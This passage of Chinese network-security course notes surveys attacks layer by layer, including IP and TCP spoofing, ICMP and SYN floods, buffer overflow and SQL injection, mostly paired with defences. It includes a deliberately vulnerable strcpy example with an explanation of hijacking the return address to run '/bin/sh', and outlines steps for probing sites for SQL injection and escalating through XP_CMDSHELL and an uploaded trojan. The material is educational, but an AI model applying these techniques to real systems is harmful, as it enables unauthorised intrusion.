<ul><li>客户端向系统申请登陆</li><li>系统发送挑战值给客户端；</li><li>客户端计算相应的应答值（可以用 MD5 算法等计算应答值）；</li><li>客户端发送应答值给系统；</li><li>系统通过同样的算法判断应答值是否正确； </li><li>如果正确则通过认证，允许用户继续后面的操作，认证结束；</li><li>不正确则断开连接，结束。  </li></ul></li><li><strong>时间戳</strong>：当主机（A）接收到了一个报文，当且仅当该报文包含了一个时间戳，且该时间戳对于 A 而言是足够接近当前时刻的， A 才认为该报文是合法的。具体的处理方式是，双方设置大小适当的时间窗（间隔）， 该时间窗越大越能包容网络传输延时（即延迟大的报文也被认为是合法的，这对于网络条件不够良好的情况来说较为重要），越小越能防范重放攻击。  </li><li><strong>序号</strong>：通信双方通过在报文中添加双方都认可的序列号， 来判断报文的新鲜性，进而判断是否合法。这要求通信双方必须事先协商一个初始序列号，并协商递增方法。这个初始序列号应该尽量避免具有一定的规律性。  </li></ol><h2 id="2-3-网络层"><a href="#2-3-网络层" class="headerlink" title="2.3 网络层"></a>2.3 网络层</h2><h3 id="2-3-1-网络层扫描"><a href="#2-3-1-网络层扫描" class="headerlink" title="2.3.1 网络层扫描"></a>2.3.1 网络层扫描</h3><p>常用的网络相关命令：</p><ol><li><strong>ping</strong>：检测网络目标主机存在与否以及网络是否正常（能否通达）。 Ping 的原理是通过向目标主机传送小数据包，目标主机接收并将该包反送回来，如果返回的数据包和发送的数据包一致，那就是说 Ping 命令成功了。  </li><li><strong>Tracert</strong>：用来跟踪一个报文从源主机到目的主机所经过的路径 </li></ol><h3 id="2-3-2-IP-欺骗"><a href="#2-3-2-IP-欺骗" class="headerlink" title="* 2.3.2 IP 欺骗"></a>* 2.3.2 IP 欺骗</h3><p>IP 欺骗就是攻击者假冒他人 IP 地址，发送数据包。由于 IP 协议不对数据包中的 IP 地址进行认证，因此任何人不经授权就可伪造 IP 包的源地址。 IP 欺骗是利用不同主机之间的信任关系而进行欺骗攻击的一种手段，这种信任关<br>系以 IP 地址验证为基础。</p><p>  <img data-src="https://cdn.jsdelivr.net/gh/Dragonliu2018/FigureBed@master/img/Snipaste_2021-05-16_01-05-14.png" class="lozad"></p><p>引例：当用户的主机 A 要与某服务器 B 建立连接时，它的通信方式是先发请求告诉对方主机 B，说“我要和你通信了”，当 B 收到时，就回复一个确认请求包（ACK）给 A 主机。如果 A 是合法地址，就会再回复一个确认（ACK）给 B 主机，然后两台主机就可以建立一个通信渠道了。</p><p>可是攻击者机器 A 发出包的源地址是一个虚假的 IP 地址，或者可以说是实际上不存在的一个地址，那么 B 发出的 ACK 自然无法找到目标地址，即无法获得对方回复的 ACK。而在缺省超时的时间范围以内，主机 B 的一部分资源要用于等待这个 ACK 的响应上，假如短时间内主机 A 接到大量来自虚假 IP 地址的请求包，它就要占用大量的资源来处理这些错误的等待。大量发送这类欺骗型的请求，其结果就是主机 B 上的系统资源耗尽以至瘫痪。</p><p><strong>目的</strong>：</p><ul><li>只想隐藏自身的 IP 地址或伪造源 IP 和目的 IP 相同的不正常包而并不关心是否能收到目标主机的应答，这样很容易实现，例如 IP 包碎片攻击、 Land 攻击等；</li><li>伪装成被目标主机信任的友好主机，并且希望得到非授权的服务，这时攻击者还需要使用正确的 TCP 序列号。  </li></ul><p><strong>防范</strong>：路由设置、捆绑、防止源路由</p><h3 id="2-3-3-碎片攻击"><a href="#2-3-3-碎片攻击" class="headerlink" title="* 2.3.3 碎片攻击"></a>* 2.3.3 碎片攻击</h3><p>在具体物理网络中，数据链路层协议对于帧的最大长度都有限制，即存在最大传输单元（MTU， Maximum Transmission Unit）。  </p><p>IP分组分片例题：一个数据报标识为 10000，分组总长度为 4980 字节，其中报文首部长度为 20 字节，数据部分长度为 4960 字节，使用互联网中某局域网进行传送，该局域网允许分片且 MTU为 1420 字节，那么这个数据报在进入这个局域网后会被分成 4 片（数据部分 4960，分成 4片，前 3 片的长度为 1400，第 4 片长度为 760。每片传输时再加上 20 字节的首部，形成一个完成的分组传递出去），各个分片的数据报首部相应字段如表 2.1：  </p><p><img data-src="https://cdn.jsdelivr.net/gh/Dragonliu2018/FigureBed@master/img/Snipaste_2021-05-16_01-14-34.png" class="lozad"></p><p>从上表可知，每个分片的数据不能重叠，这样在目的主机可以把同一标识的所有分片按照段偏移大小顺序排好，并且在看到 MF=0 的分片后进行重组。   </p><p><strong>更正</strong>：标志位 DF=1 时，表示不允许路由器对该数据报分片，因为目的主机不能重组这些分片； DF=0 表示允许分段。<strong>所以上面的DF标志均为0</strong></p><p><strong>原理</strong>：</p><p> 　　IP首部有两个字节表示整个IP数据包的长度，所以IP数据包最长只能为0xFFFF，就是65535字节。如果有意发送总长度超过65535 的IP碎片，一些老的系统内核在处理的时候就会出现问题，导致崩溃或者拒绝服务。另外，如果分片之间偏移量经过精心构造，一些系统就无法处理，导致死机。所以说，漏洞的起因是出在重组算法上。</p><p><strong>防范</strong>：</p><p>　　现在的网络操作系统已经完善了 TCP/IP 协议栈的异常处理，并且各种入侵检测系统和防火墙也可以及时发现异常的 IP 碎片，从而阻止这种类型的攻击。  </p><p>参考：<a href="https://www.cnblogs.com/wpjamer/p/4089192.html" target="_blank" rel="noopener">IP碎片原理：攻击和防护</a></p><h3 id="2-3-4-ICMP-攻击"><a href="#2-3-4-ICMP-攻击" class="headerlink" title="* 2.3.4 ICMP 攻击"></a>* 2.3.4 ICMP 攻击</h3><p><img data-src="https://cdn.jsdelivr.net/gh/Dragonliu2018/FigureBed@master/img/Snipaste_2021-05-16_10-57-02.png" class="lozad"></p><ol><li><strong>IP 地址扫描</strong>：经常出现在整个攻击过程的开始阶段，为攻击者收集信息。这种攻击用 ping 命令就能实现，在 TCP/IP 实现中，用户的 ping 命令就是利用回应请求与应答报文（回应请求报文的类型=8，回应请求应答报文的类型=0）测试目的主机是否可以到达；如果攻击者成功接收到应答报文，则说明目的主机处于“活跃”状态，可以作为攻击目标。  </li><li><strong>Ping of death</strong>：ICMP 报文作为 IP 报文的数据传输，由于 IP 报文的最大总长度为 65535 字节，因此早期路由器也限定 ICMP 包的最大长度为 64KB，并在读取 ICMP 首部后，根据其中的“类型”和“代码”字段判断为何种 ICMP 报文，并分配相应内存作为缓冲区。当出现畸形的 ICMP 包时，例如，声称自己的尺寸超过 ICMP 上限的包也就是加载的尺寸超过 64K 上限时，就会出现内存分配错误，导致 TCP/IP 堆栈崩溃，致使接受方死机。    </li><li><strong>Ping flooding 和 Smurf</strong> ：<ul><li>在某一时刻多台主机都对目标主机使用 ping 程序，致力于耗尽目标主机的网络带宽和处理能力。一个网站 1 秒钟收到数万个 ICMP 回应请求报文就可能使它过度繁忙而无法提供正常服务——这就是拒绝服务攻击方法。  </li><li>Smurf 攻击则是攻击者伪造一个源地址为受害主机的地址、目标地址是反弹网络的广播地址的 ICMP 回应请求数据包，当反弹网络的所有主机返回 ICMP 回应应答数据包的时候将淹没受害主机。它的原理和 ping flooding 类似，若反弹网络规模较大，攻击的威力也很巨大。  </li></ul></li><li><strong>ICMP 重定向报文</strong>：初始网关一旦检测到某数据报经非最优路径传输，它一边将该数据报转发出去，一边向主机发送一个路径重定向报文，告诉主机去往相应目的的最优路径。主机开机后经不断积累便能掌握越来越多的最优路径信息。通过 ICMP 重定向报文，能够保证主机拥有一个动态的既小且优的寻径表。但是， ICMP 没有认证功能，攻击者可以冒充初始网关向目标主机发送ICMP 重定向报文，诱使目标主机更改寻径表，其结果是到达某一 IP 子网的报文全部丢失或都经过一个攻击者能控制的网关。</li><li><strong>ICMP 主机不可达和 TTL 超时报文</strong>：当数据报传输路径中的路由器发现传输错误时发送报文给源主机，主机接收到此类报文后会重新建立 TCP 连接。攻击者可以利用此类报文干扰正常的通信。   </li></ol><p><strong>防范</strong>：</p><ul><li>禁止不必要的ICMP， 严格限制ICMP报文的作用范围；</li><li>禁止未经请求主动提供的ICMP应答数据包；</li><li>严格限制ICMP重定向报文的应用范围, 即如果主机目前没有数据要发送到相应站点，就不按照收到的重定向报文改变路由表；</li><li>主机与其他路由器的全局路由表也不能以重定向报文为依据修改等。</li></ul><h3 id="2-3-5-路由欺骗-课本P43"><a href="#2-3-5-路由欺骗-课本P43" class="headerlink" title="* 2.3.5 路由欺骗(课本P43)"></a>* 2.3.5 路由欺骗(课本P43)</h3><p>Internet 中 IP 包的传输路径完全由路由表决定，主机的路由表可以依据 ICMP 重定向报文而改变，路由器的路由表则要依据路由协议的路由更新报文来修改。前者属于 ICMP 攻击，后者则属于路由欺骗。</p><p><strong>RIP 路由欺骗</strong>：RIP(Routing information Protocol)协议是早期用于自治域内传播路由信息的路由协议，路由器需要定时向它的相邻路由器们发生本地的 RIP 路由更新信息。由于 RIP v1.0 中没有提供对 RIP 数据包发送者的认证机制，所以其他路由器在收到更新 RIP 数据包时一般不作检查，这也给了攻击者可趁之机。攻击者可以声称他所控制的路由器 A 可以最快地到达某一站点 B，从而诱使发往 B 的数据包由 A 中转。  </p><p><strong>防范</strong>：</p><ul><li>路由器在接受新路由前应先验证其是否可达，降低受此类攻击的概率。</li><li>路由信息在网上可见，随着假路由信息在网上的传播范围扩大，其被发现的可能性也在增大。经常检查日志文件会有助于发现此类问题</li><li>对RIP包进行身份认证，杜绝假冒路由器，但在广播型的协议中比较难实现</li></ul><p><strong>IP 源路由欺骗</strong>：如果发送方进行了源路由欺骗，比如说，C进行源路由欺骗，伪装成B的ip地址，给服务器A发送了一个包。此时A收到包后发现要返回信息，正常的话因为发送栏地址是B，应该返回给B 但是由于源路由信息记录了来时的路线，反推回去就把应该给B的信息给了C，而A没有意识到问题，B对此一无所知，C拿到了B才能拿到的信息 </p><p><strong>防范</strong>：</p><ul><li>配置好路由器，抛弃那些由外部网进来的却声称是内部主机的报文；</li><li>关闭主机和路由器上的源路由功能。</li></ul><h3 id="2-3-6-ARP-欺骗"><a href="#2-3-6-ARP-欺骗" class="headerlink" title="* 2.3.6 ARP 欺骗"></a>* 2.3.6 ARP 欺骗</h3><p><strong>防范</strong>：</p><ul><li>可参考MAC地址欺骗的防范；</li><li>使用工具：如ARPWatch，监视局域网内所有MAC地址和IP地址映射对，一旦有改变将产生告警或日志。</li></ul><h2 id="2-4-传输层"><a href="#2-4-传输层" class="headerlink" title="2.4 传输层"></a>2.4 传输层</h2><ul><li>TCP连接建立时的“三次握手”</li><li>TCP连接能被欺骗、截取、操纵</li><li>UDP易受IP源路由和拒绝服务的攻击</li></ul><h3 id="2-4-1-端口扫描"><a href="#2-4-1-端口扫描" class="headerlink" title="2.4.1 端口扫描"></a>2.4.1 端口扫描</h3><p><strong>原理</strong>：</p><ul><li>端口是TCP/IP体系中传输层的服务访问点，传输层到某端口的数据都被相应绑定到该端口的进程接收。</li><li>攻击者试图和目标主机的一系列端口（一般是保留端口和常用端口）建立连接或请求通信，若目标主机有回应，则打开了相应的应用程序或服务，攻击者就可以使用应用层的一些攻击手段。</li></ul><p><strong>端口扫描技术</strong>：</p><ol><li>TCP connect() 扫描 </li><li>TCP SYN 扫描</li><li>TCP FIN 扫描</li><li>UDP ICMP端口不能到达扫描</li><li>慢速扫描</li></ol><p><strong>对端口扫描的防范</strong>：</p><ul><li>需要进行<strong>统计分析</strong>，即在单位时间内发现接收到超过上限数目的以扫描端口为目的的数据包请求时，判断为发现端口扫描攻击。</li><li>可以在一段较长时间内对此类请求数据包进行联合分析，若发现某特定时间段内主机较为均匀地接受到此类数据包请求，则判断为慢速扫描。</li></ul><h3 id="2-4-2-TCP-初始序号预测"><a href="#2-4-2-TCP-初始序号预测" class="headerlink" title="* 2.4.2 TCP 初始序号预测"></a>* 2.4.2 TCP 初始序号预测</h3><p><strong>原理</strong>：</p><ul><li>TCP协议采用确认重传机制保证数据流的可靠性，确认以TCP的序号字段为基础。</li><li>TCP在使用三次握手机制建立连接时的初始序号有一定的随机性，但是依据其实现机制不同，可对TCP初始序号进行预测。</li></ul><p><strong>产生初始序列号的方法</strong>：</p><ul><li>64K规则：每秒用一常量（12800）增加初始序列号，如果有某一个连接启动，则用另一个常量（64000）增加序列号计数器。</li><li>与时间相关的产生规则：允许序列号产生器产生与时间相关的值。在计算机自举时产生初始值，依照每台计算机各自的时钟增加。由于各计算机上的时钟并不完全相等，增大了序列号的随机性</li><li><strong>伪随机数产生规则</strong>：操作系统使用伪随机数产生器产生初始序列号</li></ul><h3 id="2-4-3-SYN-flooding"><a href="#2-4-3-SYN-flooding" class="headerlink" title="* 2.4.3 SYN flooding"></a>* 2.4.3 SYN flooding</h3><p><strong>原理</strong>：</p><p>　　利用TCP连接三次握手过程，打开大量的半开TCP连接，使得目标机器不能进一步接受TCP连接。每个机器都需要为这种半开连接分配一定的资源，并且，这种半开连接的数量是有限制的，达到最大数量时，机器就不再接受进来的连接请求。</p><p><strong>防范</strong>：</p><ol><li>缩短SYN Timeout（连接等待超时）时间</li><li>根据源IP记录SYN连接</li><li>负反馈策略</li><li>容忍策略：基于SYN flooding攻击代码的一个缺陷</li><li>利用DNS进行负载均衡</li><li>利用防火墙技术</li></ol><h3 id="2-4-4-TCP-欺骗"><a href="#2-4-4-TCP-欺骗" class="headerlink" title="* 2.4.4 TCP 欺骗"></a>* 2.4.4 TCP 欺骗</h3><p><strong>分类</strong>：</p><ul><li><strong>非盲攻击</strong>：攻击者和被欺骗的目的主机在同一个网络上，攻击者可以简单地使用协议分析器（嗅探器）捕获TCP报文段，从而获得需要的序列号。攻击步骤如下：<ul><li>攻击者X要确定目标主机A的被信任主机B不在工作状态，若其在工作状态，也可用SYN flooding等攻击手段使其处于拒绝服务状态。</li><li>攻击者X伪造数据包：B -&gt; A : SYN(ISN C)，源IP地址使用B，初始序列号ISN为C，给目标主机发送TCP的SYN包请求建立连接。</li><li>目标主机回应数据包：A -&gt; B : SYN(ISN S) , ACK(ISN C)，初始序列号为S，确认序号为C。由于B处于拒绝服务状态，不会发出响应包。攻击者X使用嗅探器捕获TCP报文，得到初始序列号S。</li><li>攻击者X伪造数据包：B -&gt;A : ACK(ISN S)，完成三次握手建立TCP连接</li><li>攻击者X一直使用B的IP地址与A进行通信</li></ul></li><li><strong>盲攻击</strong>：由于攻击者和被欺骗的目标主机不在同一个网络上，攻击者无法使用嗅探器捕获TCP报文段。攻击步骤与非盲攻击几乎相同，在第三步用TCP初始序列号预测技术得到初始序列号。第五步，攻击者X可以发送第一个数据包，但收不到A的响应包，难实现交互。</li></ul><p><strong>防范</strong>：</p><ul><li>使用伪随机数发生器产生TCP初始序号</li><li>路由器拒绝来自外网而源IP是内网的数据包</li><li>TCP报文加密</li></ul><h3 id="2-4-5-FIN-flooding"><a href="#2-4-5-FIN-flooding" class="headerlink" title="* 2.4.5 FIN flooding"></a>* 2.4.5 FIN flooding</h3><p>FIN攻击：攻击者构造好TCP报文段后向目标主机发送，目标主机接收之后，将不再接收被欺骗主机以后发送来的数据，认为在FIN包之后的数据是由网络错误造成的。</p><h2 id="2-5-应用层"><a href="#2-5-应用层" class="headerlink" title="2.5 应用层"></a>2.5 应用层</h2><ul><li>认证、访问控制、完整性、保密性等所有安全问题</li><li>Finger,FTP,Telnet,E-mail,DNS,SNMP,…</li><li>Web,Notes, Exchange, MIS, OA, DSS…</li></ul><h3 id="2-5-1-缓冲区溢出（课本P52）"><a href="#2-5-1-缓冲区溢出（课本P52）" class="headerlink" title="* 2.5.1 缓冲区溢出（课本P52）"></a>* 2.5.1 缓冲区溢出（课本P52）</h3><h4 id="2-5-1-1-概念"><a href="#2-5-1-1-概念" class="headerlink" title="2.5.1.1 概念"></a>2.5.1.1 概念</h4><p>　　缓冲区溢出是指当计算机向缓冲区内填充数据位数时超过了缓冲区本身的容量，溢出的数据覆盖了其他程序或系统的合法数据。</p><p>　　如果所有程序都严格地先申请足够的缓冲区长度，然后检查数据的长度，不允许输入超过缓冲区长度的数据存入缓冲区，那么就不会产生缓冲区溢出的问题。但是，大多数程序员习惯于假设数据长度总是与所分配的储存空间相匹配，这就为缓冲区溢出埋下隐患。(<strong>原因</strong>)</p><p>　　缓冲区可以设在堆栈（stack，自动变量）、堆（heap，动态分配的内存区）或静态资料区。缓冲区溢出是一种非常普遍而危险的漏洞，其中最为危险的是堆栈溢出，因为攻击者可以利用堆栈溢出，在函数返回时改变返回程序的地址，让其跳转到任意地址，可以利用它使系统崩溃导致拒绝服务，也可以利用它执行非授权指令，甚至可以取得系统特权，进而进行各种非法操作。  </p><h4 id="2-5-1-2-代码示例"><a href="#2-5-1-2-代码示例" class="headerlink" title="2.5.1.2 代码示例"></a>2.5.1.2 代码示例</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">fun</span><span class="params">( <span class="keyword">char</span> *str )</span> </span>&#123; </span><br><span class="line">    <span class="keyword">char</span> buffer[<span class="number">16</span>]; </span><br><span class="line">    <span class="built_in">strcpy</span>( buffer, str ); </span><br><span class="line">&#125; </span><br><span class="line">Main( ) &#123;</span><br><span class="line">    <span class="keyword">char</span> buffer[<span class="number">256</span>];</span><br><span class="line">   <span class="keyword">int</span> i;</span><br><span class="line">   <span class="keyword">for</span> ( i = <span class="number">0</span>; i&lt;<span class="number">256</span>; i++ )</span><br><span class="line">  buffer[i] = ‘A’ ;</span><br><span class="line">   fun( buffer ) ;</span><br><span class="line">    <span class="built_in">printf</span>( ‘%s’, buffer ) ;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译执行这段代码后出现这样的提示： <strong>Segmentation fault （core dumped ），这意味着发生了缓冲区溢出。</strong></p><p>如果在 buffer 中保存的不是字符 A，而是攻击者想执行的代码（shellcode： Unix/Linux  环境下外壳代码），其溢出部分的长度覆盖了调用函数 fun 的返回地址（ret），使它指向缓冲区中 shellcode（其内容是取得高级权限的恶意代码）的开头。那么，在当前执行进程（或函数）返回的时就可以跳转到 shellcode 处，并且攻击者会获得管理员权限，这样就可以在目标主机上植入木马，修改建立一个新的 socket 连接等。  </p><h4 id="2-5-1-3-原理"><a href="#2-5-1-3-原理" class="headerlink" title="2.5.1.3 原理"></a>2.5.1.3 原理</h4><p>当程序中发生函数调用时，步骤如下：</p><ol><li>把参数压入堆栈；</li><li>保存指令寄存器（IP）中的内容，作为返回地址（RET）；</li><li>将基址寄存器（FP）压入堆栈；</li><li>把当前的栈指针（SP）拷贝到 FP，做为新的基地址；</li><li>为本地变量分配空间，把 SP 减去适当的数值。</li></ol><p>在上面的小例子中，从 buf 开始的 256 个字节都将被*str 的内容<code>A</code>覆盖，包括 sfp、 ret，甚至*str。而‘A’的十六进值为 0x41，所以函数的返回地址变成了 0x41414141，超出了程序的地址空间，所以会出现段错误 Segmentation fault （core dumped） 。  </p><p>下一步，在溢出的缓冲区中写入想执行的代码，再覆盖返回地址（ ret）的内容，使它指向缓冲区的开头，就可以达到运行其它指令的目的 。如果攻击者想要执行的代码已经在被攻击的程序中了，他只要对代码传递一些参数。例如，攻击代码要求执行 exec（“/bin/sh”） ，而在 libc 库中的代码执行 exec （arg），其中 arg 是字符串的指针参数，攻击者只要把传入的参数指针改向指向“/bin/sh”即可。  </p><h4 id="2-5-1-4-引起原因"><a href="#2-5-1-4-引起原因" class="headerlink" title="2.5.1.4 引起原因"></a>2.5.1.4 引起原因</h4><ul><li>程序员层面：在概念中有所涉及</li><li>程序层面：结合原理作答</li></ul><h4 id="2-5-1-5-防止"><a href="#2-5-1-5-防止" class="headerlink" title="2.5.1.5 防止"></a>2.5.1.5 防止</h4><p>栈保护措施 canary机制、栈不可执行（NX）、地址随机化（PIE、ASLR）机制。</p><h3 id="2-5-2-口令攻击"><a href="#2-5-2-口令攻击" class="headerlink" title="* 2.5.2 口令攻击"></a>* 2.5.2 口令攻击</h3><p>获得用户口令的方法还有猜测、字典攻击、暴力破解、利用工具破解等  </p><p><strong>字典攻击</strong>：字典攻击的做法是将字典中的大量单词送到函数 crypt()中，看看是否有与/etc/passwd 文件中加密口令相匹配的单词。如果有一个单词与目标口令匹配，则认为口令被破解，并将其相应的明码正文单词保存到文件。  </p><h3 id="2-5-3-电子邮件攻击"><a href="#2-5-3-电子邮件攻击" class="headerlink" title="2.5.3 电子邮件攻击"></a>2.5.3 电子邮件攻击</h3><h3 id="2-5-4-DNS-欺骗"><a href="#2-5-4-DNS-欺骗" class="headerlink" title="2.5.4 DNS 欺骗"></a>2.5.4 DNS 欺骗</h3><p><strong>欺骗方法</strong>：</p><ul><li>将用户想要浏览的网页的URL改写为指向攻击者自己的服务器，当用户浏览目标网页的时候，实际上是向攻击者服务器发出请求</li><li>DNS协议不对转换或信息的更新进行身份认证，攻击者可以将不正确的信息掺进来并把用户引向攻击者自己的主机</li></ul><p><strong>防范</strong>：用DNS转换得到的IP地址或域名再次作反向转换进行验证</p><h3 id="2-5-5-SQL-注入"><a href="#2-5-5-SQL-注入" class="headerlink" title="* 2.5.5 SQL 注入"></a>* 2.5.5 SQL 注入</h3><p>SQL 注入攻击最常见的原因是动态构造了 SQL 语句，却没有使用正确的参数。</p><p><strong>寻找容易受到 SQL 注入攻击的网站的步骤如下</strong>：</p><ol><li>首先寻找动态网站，即那些可以带查询字符串的网站，能够与用户进行动态交互的，这样的网站有很多。例如： <a href="http://www.***.com.cn/viewtext.asp?id=144581；" target="_blank" rel="noopener">http://www.***.com.cn/viewtext.asp?id=144581；</a></li><li>给这个网站发送一个请求，改变其中的“id=…”语句，带一个额外的单引号，试图取消其中的 SQL 语句，例如 id=144581’ ；</li><li>分析返回的回复，在其中查找 “SQL”、 “query”这类关键字，这些往往表示应用返回了详细的错误消息；</li><li>检查错误消息，如果表示了发送到 SQL 服务器的参数没有被正确加码，就意味着可对该网站进行 SQL 注入攻击 。    </li></ol><p><strong>步骤</strong>：</p><ol><li>判定 SQL 注入漏洞  </li><li>分析数据库服务器类型  </li><li>确定 XP_CMDSHELL 可执行情况  </li><li>发现 WEB 虚拟目录  </li><li>上传 ASP 木马  </li><li>得到系统的管理员权限 </li></ol><h3 id="2-5-6-IIS漏洞"><a href="#2-5-6-IIS漏洞" class="headerlink" title="* 2.5.6 IIS漏洞"></a>* 2.5.6 IIS漏洞</h3><ul><li>IIS是Internet Information Services的缩写，意为互联网信息服务，是由微软公司提供的基于运行Microsoft Windows的互联网基本服务。</li><li>IIS的安全脆弱性曾长时间被业内诟病，一旦IIS出现远程执行漏洞威胁将会非常严重。远程执行代码漏洞存在于 HTTP 协议堆栈 (HTTP.sys) 中，当 HTTP.sys 未正确分析经特殊设计的 HTTP 请求时会导致此漏洞。 成功利用此漏洞的攻击者可以在系统帐户的上下文中执行任意代码，可以导致IIS服务器所在机器蓝屏或读取其内存中的机密数据。</li></ul><p><strong>参考</strong>：<a href="https://www.aqniu.com/learn/43996.html" target="_blank" rel="noopener">https://www.aqniu.com/learn/43996.html</a></p><h3 id="2-5-7-常见的应用层安全协议有："><a href="#2-5-7-常见的应用层安全协议有：" class="headerlink" title="* 2.5.7 常见的应用层安全协议有："></a>* 2.5.7 常见的应用层安全协议有：</h3><ul><li>PGP（Pretty Good Privacy），用于邮件安全；</li><li>S-HTTP，Web上使用的超文本传输协议（HTTP）的安全增强版本；</li><li>安全电子交易SET，用于电子商务；</li><li>SSH，允许用户安全地登录到远程主机上执行命令或传输文件；</li><li>Kerberos，用于客户/服务器环境下网络服务的鉴别等。</li></ul><h2 id="2-6-网络病毒与木马"><a href="#2-6-网络病毒与木马" class="headerlink" title="2.6 网络病毒与木马"></a>2.6 网络病毒与木马</h2><h3 id="2-6-1-病毒"><a href="#2-6-1-病毒" class="headerlink" title="* 2.6.1 病毒"></a>* 2.6.1 病毒</h3><ul><li>计算机病毒是指编制或者在计算机程序中插入的破坏计算机功能或者破坏数据，影响计算机使用并且能够自我复制的一组计算机指令或者程序代码  </li><li>病毒的特征可以概括为：人为的特制程序，具有自我复制能力，很强的感染性，一定的潜伏性，特定的触发性，很大的破坏性。 </li></ul><h3 id="2-6-2-特洛伊木马"><a href="#2-6-2-特洛伊木马" class="headerlink" title="* 2.6.2 特洛伊木马"></a>* 2.6.2 特洛伊木马</h3><ul><li>木马的特点包括隐蔽性、顽固性、潜伏性</li></ul><h2 id="2-7-拒绝服务攻击"><a href="#2-7-拒绝服务攻击" class="headerlink" title="* 2.7 拒绝服务攻击"></a>* 2.7 拒绝服务攻击</h2><ul><li>拒绝服务（DoS,Denial of Service)攻击：耗尽目标主机的资源，使目标主机不能对外提供正常的服务。</li><li>IGMPNuke、Land、smurf、teardrop、SYN flooding、winnuke、UDP flooding等都属于DoS攻击</li><li>分布式拒绝服务（DDoS，Distributed Denial of Service)是DoS的进一步演化。</li><li>DDoS引进了client/server机制，增加了分布式的概念。集中几百上千台主机向目标主机进行攻击，使DoS的威力以几十几百倍的程度激增。DDoS囊括了已经出现的各种DoS方法，其破坏能力巨大。</li></ul><p><strong>防范</strong>：</p><ul><li>优化路由和网络结构，调整路由表以将拒绝服务攻击的影响减到最小；</li><li>应用路由器的带宽分配技术；</li><li>优化可能成为攻击目标的主机，禁止所有不必要的服务；</li><li>定期扫描漏洞，及时安装补丁程序，定期升级系统软件；</li><li>当检测到DoS时，若发现攻击数据包来自某些ISP时应尽快和他们取得联系；</li><li>负载均衡技术和蜜罐（honeypot）技术。 </li></ul><h1 id="Ch3-网络身份认证"><a href="#Ch3-网络身份认证" class="headerlink" title="Ch3 网络身份认证"></a>Ch3 网络身份认证</h1><h1 id="Ch4-网络访问控制"><a href="#Ch4-网络访问控制" class="headerlink" title="Ch4 网络访问控制"></a>Ch4 网络访问控制</h1><h2 id="4-1-访问控制策略"><a href="#4-1-访问控制策略" class="headerlink" title="* 4.1 访问控制策略"></a>* 4.1 访问控制策略</h2><ul><li>自主访问控制（discretionary policies)，基于身份的访问控制IBAC(Identity Based Access Control) </li><li>强制访问控制(mandatory policies)，系统根据主体被信任的程度和客体所包含的信息的机密性或敏感程度来决定主体对客体的访问权，可通过给主、客体赋以安全标记来实现。</li><li>基于角色的访问控制(role-based policies)：RBAC（Rule Based Access Control）</li></ul><h2 id="4-2-防火墙-—-访问控制技术"><a href="#4-2-防火墙-—-访问控制技术" class="headerlink" title="4.2 防火墙 — 访问控制技术"></a>4.2 防火墙 — 访问控制技术</h2><p><strong>缺点</strong>：</p><ol><li>不能防止内部的攻击</li><li>会限制或者关闭有用而又存在安全隐患的服务</li><li>不能防止数据驱动型攻击</li><li>不能防止绕过防火墙的攻击</li><li>不能防止带毒文件</li><li>不能防止新出现的网络安全问题</li></ol><h3 id="4-2-1-防火墙体系结构"><a href="#4-2-1-防火墙体系结构" class="headerlink" title="4.2.1 防火墙体系结构"></a>4.2.1 防火墙体系结构</h3><h4 id="4-2-1-1-包过滤防火墙"><a href="#4-2-1-1-包过滤防火墙" class="headerlink" title="* 4.2.1.1 包过滤防火墙"></a>* 4.2.1.1 包过滤防火墙</h4><p><strong>原理</strong>：</p><ul><li>包过滤防火墙用路由器实现对所接收的每个数据包做允许或拒绝的决定。路由器审查每个数据包，以便确定其是否与某一条包过滤规则匹配。</li><li>包的进入接口和出接口如果有<strong>匹配</strong>并且规则<strong>允许</strong>该数据包，那么该数据包就会按照路由表中的信息被<strong>转发</strong>。</li><li>如果<strong>匹配</strong>并且规则<strong>拒绝</strong>该数据包，那么该数据包就会被<strong>丢弃</strong>。</li><li>如果没有匹配规则，用户配置的缺省参数会决定是转发还是丢弃数据包。</li></ul><p><strong>数据包过滤检查网络层的IP头和传输层的头</strong>：</p><ul><li>IP源地址</li><li>IP目标地址</li><li>传输层协议类型（TCP包、UDP包和ICMP包）</li><li>TCP或UDP包的目的端口</li><li>TCP或UDP包的源端口</li><li>ICMP消息类型</li><li>TCP包头的确认位(ACK位)</li><li>TCP包的序号、确认序号等</li></ul><p><strong>优点</strong>：</p><ul><li><p>速度快，性能高</p></li><li><p>对用户透明</p></li></ul><p><strong>缺点</strong>：</p><ul><li><p>维护比较困难(定义数据包过滤器比较复杂，需要管理员对TCP/IP深入了解）</p></li><li><p>安全性低（ IP欺骗:外部主机伪装其他可信任外部主机的IP）</p></li><li><p>不提供有用的日志，或根本就不提供</p></li><li><p>不防范数据驱动型攻击</p></li><li><p>无法对网络上流动的信息提供全面的控制</p></li></ul><p><strong>针对包过滤防火墙的攻击</strong>：</p><ul><li>IP地址欺骗，例如，假冒内部的IP地址<ul><li>对策：在外部接口上禁止内部地址</li></ul></li><li><p>源路由攻击，即由源指定路由</p><ul><li>对策：禁止这样的选项</li></ul></li><li><p>小碎片攻击，利用IP分片功能把TCP头部切分到不同的分片中</p><ul><li>对策：丢弃分片太小的分片</li></ul></li><li><p>利用复杂协议和管理员的配置失误进入防火墙</p><ul><li>例如，利用ftp协议对内部进行探查</li></ul></li></ul><h4 id="4-2-1-2-双重宿主主机防火墙"><a href="#4-2-1-2-双重宿主主机防火墙" class="headerlink" title="* 4.2.1.2 双重宿主主机防火墙"></a>* 4.2.1.2 